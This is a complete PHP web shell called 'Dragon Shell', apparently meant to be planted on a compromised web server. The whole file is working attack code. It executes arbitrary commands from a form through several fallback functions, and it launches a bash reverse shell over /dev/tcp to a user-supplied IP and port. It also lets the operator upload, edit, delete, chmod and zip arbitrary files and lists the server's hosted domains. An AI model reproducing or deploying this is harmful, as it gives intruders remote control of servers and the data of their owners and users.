<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);

function perms($f){
    $p = fileperms($f);
    $t = ($p & 0xC000) == 0xC000 ? 's' :
         (($p & 0xA000) == 0xA000 ? 'l' :
         (($p & 0x8000) == 0x8000 ? '-' :
         (($p & 0x6000) == 0x6000 ? 'b' :
         (($p & 0x4000) == 0x4000 ? 'd' :
         (($p & 0x2000) == 0x2000 ? 'c' :
         (($p & 0x1000) == 0x1000 ? 'p' : 'u'))))));
    $t .= ($p & 0x0100) ? 'r' : '-';
    $t .= ($p & 0x0080) ? 'w' : '-';
    $t .= ($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-');
    $t .= ($p & 0x0020) ? 'r' : '-';
    $t .= ($p & 0x0010) ? 'w' : '-';
    $t .= ($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-');
    $t .= ($p & 0x0004) ? 'r' : '-';
    $t .= ($p & 0x0002) ? 'w' : '-';
    $t .= ($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-');
    return $t;
}

function cmd($c){
    $c .= " 2>&1";
    $f = ["shell_exec", "system", "exec", "passthru"];
    foreach($f as $fn){
        if(function_exists($fn) && is_callable($fn)){
            ob_start();
            call_user_func($fn, $c);
            return ob_get_clean();
        }
    }
    if(function_exists("proc_open")){
        $descriptorspec = [["pipe","r"],["pipe","w"],["pipe","w"]];
        $process = proc_open($c, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
            return $output;
        }
    }
    if(function_exists("popen")){
        $fp = popen($c, "r");
        $o = "";
        while (!feof($fp)) {
            $o .= fread($fp, 1024);
        }
        pclose($fp);
        return $o;
    }
    return "⚠️ Command execution blocked.";
}

$cwd = getcwd();
if(isset($_GET['path'])) {
    $p = $_GET['path'];
    if(is_dir($p)) {
        chdir($p);
        $cwd = getcwd();
    }
}

if(isset($_POST['zipname']) && isset($_POST['zipfiles'])){
    $zip = new ZipArchive();
    $z = $_POST['zipname'];
    if($zip->open($z, ZipArchive::CREATE) === TRUE){
        foreach($_POST['zipfiles'] as $f){
            if(is_dir($f)){
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f), RecursiveIteratorIterator::SELF_FIRST);
                foreach($it as $ff){
                    if(!$ff->isDir())
                        $zip->addFile($ff->getPathname(), substr($ff->getPathname(), strlen($cwd)+1));
                }
            } else {
                $zip->addFile($f, basename($f));
            }
        }
        $zip->close();
        echo "✅ ZIP created: <a href='$z'>$z</a><br>";
    } else echo "❌ ZIP fail<br>";
}

if(isset($_POST['unzip']) && file_exists($_POST['unzip'])){
    $z = new ZipArchive();
    if($z->open($_POST['unzip']) === TRUE){
        $z->extractTo($cwd);
        $z->close();
        echo "✅ Unzipped<br>";
    } else echo "❌ Unzip Failed<br>";
}

if(isset($_POST['rshell_ip']) && isset($_POST['rshell_port'])){
    $ip = $_POST['rshell_ip'];
    $port = $_POST['rshell_port'];
    $r = "bash -i >& /dev/tcp/$ip/$port 0>&1";
    @exec($r); @shell_exec($r); @system($r); @passthru($r);
    echo "💀 Reverse shell attempt sent to $ip:$port<br>";
}

if(isset($_GET['delete'])) {
    is_dir($_GET['delete']) ? rmdir($_GET['delete']) : unlink($_GET['delete']);
}
if(isset($_POST['newname']) && isset($_POST['oldname'])) rename($_POST['oldname'], $_POST['newname']);
if(isset($_POST['chmod']) && isset($_POST['target'])) chmod($_POST['target'], octdec($_POST['chmod']));
if(isset($_POST['save']) && isset($_POST['file'])) file_put_contents($_POST['file'], $_POST['save']);
if(isset($_FILES['upload'])) {
    @copy($_FILES['upload']['tmp_name'], $_FILES['upload']['name']) ? print "✅ Uploaded<br>" : print "❌ Upload failed<br>";
}
if(isset($_POST['folder']) && !empty($_POST['folder'])) {
    mkdir($cwd.'/'.$_POST['folder']);
    echo "📁 Folder created<br>";
}
if(isset($_POST['newfile']) && isset($_POST['filename'])){
    file_put_contents($cwd.'/'.$_POST['filename'], $_POST['newfile']);
    echo "📄 File created<br>";
}

echo "<html><head><title>🐉 Dragon Shell</title><style>
body{background:#000;color:#0f0;font-family:monospace}
a{color:cyan;text-decoration:none}input,textarea{background:#111;color:#0f0;border:1px solid #0f0;}
</style></head><body>";

echo "<h2>🐉 DRAGON SHELL</h2>";
echo "<b>Dir:</b> $cwd<br><b>User:</b> ".get_current_user()." | UID: ".getmyuid()."<br><b>IP:</b> ".$_SERVER['SERVER_ADDR']."<hr>";

if(isset($_POST['terminal_cmd'])){
    echo "<h3>💻 Terminal Output</h3><textarea rows='10' cols='100'>".htmlspecialchars(cmd($_POST['terminal_cmd']))."</textarea><hr>";
}
echo "<form method='POST'>Terminal: <input name='terminal_cmd' size='60'><input type='submit' value='Run'></form>";

echo "<form method='POST' enctype='multipart/form-data'>Upload: <input type='file' name='upload'><input type='submit' value='Upload'></form>";
echo "<form method='POST'>New Folder: <input name='folder'><input type='submit' value='Create'></form>";
echo "<form method='POST'>New File: <input name='filename'> Content: <input name='newfile'><input type='submit' value='Create'></form>";
echo "<form method='POST'>Unzip File: <input name='unzip'><input type='submit' value='Unzip'></form>";
echo "<form method='POST'>Reverse Shell → IP: <input name='rshell_ip'> Port: <input name='rshell_port'><input type='submit' value='Send'></form>";
echo "<form method='GET'>Change Dir: <input name='path' value='$cwd' size='60'><input type='submit' value='Go'></form>";

echo "<form method='POST'><hr><table border='1' cellpadding='5' style='border-collapse:collapse;width:100%'>";
echo "<tr><th>Select</th><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>";
foreach(scandir($cwd) as $f){
    if($f==".") continue;
    $p="$cwd/$f";
    echo "<tr><td><input type='checkbox' name='zipfiles[]' value='$p'></td><td>";
    echo is_dir($p) ? "[<a href='?path=$p'>$f</a>]" : "<a href='?view=$p'>$f</a>";
    echo "</td><td>".(is_file($p)?filesize($p):"-")."</td><td>".perms($p)."</td><td>";
    echo "<a href='?delete=$p' onclick='return confirm(\"Delete $f?\")'>Delete</a> ";
    echo "<form method='POST' style='display:inline;'><input type='hidden' name='oldname' value='$p'><input name='newname' value='$f'><input type='submit' value='Rename'></form> ";
    echo "<form method='POST' style='display:inline;'><input type='hidden' name='target' value='$p'><input name='chmod' size='4'><input type='submit' value='Chmod'></form>";
    echo "</td></tr>";
}
echo "</table><br>ZIP as: <input name='zipname' value='archive.zip'><input type='submit' value='ZIP'></form>";

if(isset($_GET['view'])){
    $f=$_GET['view'];
    echo "<hr><h3>📝 Edit: $f</h3>";
    echo "<form method='POST'><input type='hidden' name='file' value='$f'><textarea name='save' rows='20' cols='100'>".htmlspecialchars(file_get_contents($f))."</textarea><br><input type='submit' value='Save'></form>";
}

echo "<hr><h3>🌐 Domains</h3><pre>";
$domains=[];
if(is_dir("/etc/valiases")) foreach(scandir("/etc/valiases") as $d){if($d!="." && $d!="..")$domains[]=$d;}
elseif(file_exists("/etc/named.conf")){preg_match_all('/zone "(.*?)"/',file_get_contents("/etc/named.conf"),$m);$domains=$m[1];}
echo implode("\n",$domains);
echo "</pre></body></html>";
?>
